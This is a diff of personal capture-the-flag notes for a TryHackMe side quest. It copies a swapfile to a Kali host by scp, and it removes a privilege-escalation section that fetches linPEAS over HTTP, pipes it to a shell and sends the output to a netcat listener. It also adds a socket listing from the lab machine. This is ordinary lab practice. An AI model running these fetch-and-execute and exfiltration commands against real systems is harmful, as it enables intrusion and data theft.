@@ -128,11 +128,9 @@ cat flag.txt
 
 
 ### BONUS ###
-
-2025-12-29 16:09:33 EST -- 
 -----------------------
 # Starting on new day to find this egg
-ip=10.64.183.228
+ip=10.64.129.163
 
 // *SideQuest 2 EggKey* //
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
@@ -201,40 +199,16 @@ find / -type f -iname "sq*.png" 2>/dev/null
 //Found a weird location for a swapfile in /
 scp swapfile kali@192.168.190.148:/home/kali/haxterm/data/Day09
 
-
-// Privesc -- Linux
-<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
-
-# Local network
-// Install peass
-sudo apt install -y peass
-cp /usr/share/peass/linpeas/linpeas.sh .
+~/.john/john.pot
 
 
-// Download, execute from memory, & save output on kali
-  // KALI term1
-sudo python3 -m http.server 80
-  // KALI term2
-nc -lvnp 443 | tee linpeas_ubuntu.out
-
-  // CurlTarget for ubuntu
-curl 192.168.190.148:80/linpeas.sh | sh | nc 192.168.190.148 443
-
-sudo su -
-
-## Now with root
-nc -lvnp 443 | tee linpeas_root.out
-  // CurlTarget for root
-curl 192.168.190.148:80/linpeas.sh | sh | nc 192.168.190.148 443
-
-
-// View linpeas output
-less -R linpeas_ubuntu.out
-less -R linpeas_root.out
-
->>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-
-
+root@tryhackme:~# ss -4antl
+State                Recv-Q               Send-Q                             Local Address:Port                             Peer Address:Port              Process              
+LISTEN               0                    4096                                  127.0.0.54:53                                    0.0.0.0:*                                      
+LISTEN               0                    100                                      0.0.0.0:80                                    0.0.0.0:*                                      
+LISTEN               0                    5                                        0.0.0.0:5901                                  0.0.0.0:*                                      
+LISTEN               0                    4096                               127.0.0.53%lo:53                                    0.0.0.0:*                                      
+LISTEN               0                    4096                                   127.0.0.1:631                                   0.0.0.0:*
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
